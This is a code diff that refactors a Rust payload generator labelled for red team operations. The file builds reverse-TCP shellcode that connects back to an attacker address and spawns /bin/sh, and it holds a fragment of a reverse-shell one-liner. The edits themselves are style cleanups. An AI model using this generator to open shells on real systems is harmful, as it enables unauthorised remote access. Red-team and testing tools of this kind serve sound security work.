@@ -2,6 +2,7 @@
 //! and stager construction. Pure-Rust implementations for red team operations.
 
 use std::fmt;
+use std::fmt::Write as _;
 
 // ─── Shell Payload Types ─────────────────────────────────────────────────────
 
@@ -200,7 +201,7 @@ pub fn is_valid_ipv4(lhost: &str) -> bool {
     reverse_tcp_shellcode(lhost, 0).is_some()
 }
 
-/// Builds a Linux x86_64 reverse-TCP shellcode stub that connects back to
+/// Builds a Linux `x86_64` reverse-TCP shellcode stub that connects back to
 /// `lhost`:`lport` and spawns `/bin/sh` over the socket. The address and port
 /// are embedded directly into the instruction stream (metasploit-style
 /// `x64/shell_reverse_tcp`), so `lhost` must be a dotted-quad IPv4 address —
@@ -215,11 +216,8 @@ fn reverse_tcp_shellcode(lhost: &str, lport: u16) -> Option<String> {
     }
     let mut ip = [0_u8; 4];
     for (index, octet) in octets.iter().enumerate() {
-        let value: u16 = octet.parse().ok()?;
-        if value > 255 {
-            return None;
-        }
-        ip[index] = value as u8;
+        let value: u8 = octet.parse().ok()?;
+        ip[index] = value;
     }
 
     // 8-byte sockaddr pushed on the stack, memory order:
@@ -268,12 +266,10 @@ fn reverse_tcp_shellcode(lhost: &str, lport: u16) -> Option<String> {
         0x0f, 0x05, // syscall execve("/bin/sh", ["/bin/sh"], NULL)
     ]);
 
-    Some(
-        bytes
-            .iter()
-            .map(|byte| format!("\\x{byte:02x}"))
-            .collect::<String>(),
-    )
+    Some(bytes.iter().fold(String::new(), |mut acc, byte| {
+        let _ = write!(acc, "\\x{byte:02x}");
+        acc
+    }))
 }
 
 /// Generate a reverse shell payload for the given shell type.
@@ -317,12 +313,9 @@ exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
             // the requested address and port embedded. A numeric IPv4 is
             // required; callers validate up front, so this arm only fires as
             // a defensive fallback that never silently drops the endpoint.
-            match reverse_tcp_shellcode(lhost, lport) {
-                Some(code) => code,
-                None => {
-                    format!("[error: tcp shellcode requires a numeric IPv4 lhost; got {lhost}]")
-                }
-            }
+            reverse_tcp_shellcode(lhost, lport).unwrap_or_else(|| {
+                format!("[error: tcp shellcode requires a numeric IPv4 lhost; got {lhost}]")
+            })
         }
         ShellType::ReverseHttp | ShellType::ReverseHttps => {
             format!(
